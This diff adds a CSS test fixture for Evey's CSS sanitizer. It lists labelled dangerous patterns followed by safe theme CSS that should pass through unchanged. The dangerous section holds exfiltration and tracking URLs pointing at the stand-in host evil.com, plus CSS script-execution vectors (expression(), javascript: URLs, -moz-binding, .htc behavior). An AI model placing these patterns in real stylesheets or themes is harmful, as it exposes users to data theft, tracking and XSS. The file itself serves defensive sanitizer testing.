@@ -1,0 +1,70 @@
+/*
+ * Malicious Theme Test
+ *
+ * This file demonstrates dangerous CSS patterns that Evey's CSS sanitizer
+ * should strip. Used for testing and documenting the sanitizer behavior.
+ * Each section shows a dangerous pattern and explains why it's blocked.
+ */
+
+/* ---- DANGEROUS: @import — can load arbitrary external stylesheets ---- */
+@import url(https://evil.com/steal.css);
+
+/* ---- DANGEROUS: external URL in background-image — data exfiltration ---- */
+/* An attacker could encode stolen data into the URL query string */
+.exfil { background-image: url(https://evil.com/?data=exfiltrate); }
+
+/* ---- DANGEROUS: expression() — IE CSS expression, executes JavaScript ---- */
+.ie-xss { width: expression(alert(1)); }
+
+/* ---- DANGEROUS: -moz-binding — Firefox XBL binding, can execute code ---- */
+.xbl-xss { -moz-binding: url(evil.xml#xss); }
+
+/* ---- DANGEROUS: javascript: URL scheme — direct script execution ---- */
+.js-url { background: url(javascript:alert(1)); }
+
+/* ---- DANGEROUS: behavior — IE .htc behavior files, can execute code ---- */
+.htc-xss { behavior: url(malicious.htc); }
+
+/* ---- DANGEROUS: http URL (not just https) ---- */
+.http-track { background: url(http://evil.com/track.png); }
+
+/* ---- DANGEROUS: protocol-relative URL — still loads external resource ---- */
+.proto-rel { background: url(//evil.com/img.png); }
+
+/* ==================================================================== */
+/* SAFE CSS below — should pass through the sanitizer unchanged         */
+/* ==================================================================== */
+
+:root {
+  --accent: #e11d48;
+  --bg: #0f0f0f;
+  --surface: #1a1a1a;
+  --text: #f5f5f5;
+}
+
+body {
+  color: var(--text);
+  background: var(--bg);
+}
+
+.card {
+  background: var(--surface);
+  border-radius: 8px;
+  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+}
+
+/* data: URLs are safe (inline images) */
+.icon { background: url(data:image/svg+xml;base64,PHN2Zy8+); }
+
+/* Relative paths are safe */
+.bg { background: url(../images/bg.jpg); }
+
+@media (max-width: 768px) {
+  .card { padding: 8px; }
+}
+
+@keyframes pulse {
+  0% { opacity: 1; }
+  50% { opacity: 0.6; }
+  100% { opacity: 1; }
+}
